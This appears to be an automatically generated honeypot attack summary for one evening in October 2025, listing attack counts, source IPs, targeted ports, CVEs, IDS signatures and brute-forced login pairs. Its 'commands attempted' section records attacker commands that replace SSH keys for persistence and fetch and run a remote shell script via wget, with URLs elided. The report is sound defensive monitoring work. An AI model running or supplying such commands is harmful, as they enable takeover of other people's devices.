Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-19T21:01:27Z
**Timeframe:** 2025-10-19T20:20:01Z to 2025-10-19T21:00:01Z
**Log Files:**
- agg_log_20251019T202001Z.json
- agg_log_20251019T204001Z.json
- agg_log_20251019T210001Z.json

**Executive Summary**

This report summarizes 16,619 attacks recorded by honeypot systems. The majority of attacks were captured by the Cowrie and Honeytrap honeypots. The most frequent attacks targeted ports associated with VoIP (5038, 5060), followed by SSH (22) and SMB (445). A significant number of attacks originated from IP address 198.23.238.154. Several CVEs were exploited, with CVE-2005-4050 being the most common. Attackers attempted a variety of commands, primarily focused on reconnaissance and establishing persistent access.

**Detailed Analysis**

***Attacks by Honeypot:***
- Cowrie: 5897
- Honeytrap: 5269
- Suricata: 1982
- Sentrypeer: 1643
- Dionaea: 895
- Ciscoasa: 603
- Heralding: 98
- Mailoney: 90
- Adbhoney: 37
- ConPot: 34
- H0neytr4p: 26
- Tanner: 21
- Ipphoney: 9
- ElasticPot: 5
- Dicompot: 3
- Redishoneypot: 3
- Honeyaml: 2
- ssh-rsa: 2

***Top Attacking IPs:***
- 198.23.238.154
- 138.197.43.50
- 186.10.24.214
- 72.146.232.13
- 198.23.190.58
- 23.94.26.58
- 198.12.68.114
- 164.92.146.119
- 104.248.196.40
- 103.144.245.138

***Top Targeted Ports/Protocols:***
- 5038
- 5060
- 22
- UDP/5060
- 445
- 5903
- 8333
- 5901
- vnc/5900
- 25

***Most Common CVEs:***
- CVE-2005-4050
- CVE-2002-0013 CVE-2002-0012
- CVE-2021-3449 CVE-2021-3449
- CVE-2019-11500 CVE-2019-11500
- CVE-2021-35395 CVE-2021-35395
- CVE-2016-20017 CVE-2016-20017
- CVE-2022-27255 CVE-2022-27255

***Commands Attempted by Attackers:***
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- free -m | grep Mem
- uname -a
- whoami
- lscpu | grep Model
- cd /data/local/tmp/; busybox wget http://...; sh w.sh;

***Signatures Triggered:***
- ET VOIP MultiTech SIP UDP Overflow
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET INFO VNC Authentication Failure
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET INFO Reserved Internal IP Traffic
- ET CINS Active Threat Intelligence Poor Reputation IP group 48
- ET HUNTING RDP Authentication Bypass Attempt

***Users / Login Attempts:***
- 345gs5662d34/345gs5662d34
- user01/Password01
- admin/555
- config/config2010
- hossein/3245gs5662d34
- deploy/123123
- root/801tc0melite
- guest/77777
- nobody/22222
- config/alpine

***Files Uploaded/Downloaded:***
- wget.sh;
- s:Envelope>
- w.sh;
- c.sh;

***HTTP User-Agents:***
- No user agents recorded.

***SSH Clients and Servers:***
- No SSH clients or servers recorded.

***Top Attacker AS Organizations:***
- No AS organizations recorded.

**Key Observations and Anomalies**

The observed attacks show a strong focus on compromising devices through credential stuffing and exploiting known vulnerabilities. The commands executed post-exploitation indicate attempts to gather system information and establish persistence by adding SSH keys. The high volume of traffic to VoIP-related ports suggests a widespread scanning effort for vulnerable SIP devices. The consistency of attacking IPs across the monitoring period indicates targeted efforts from a limited set of actors.
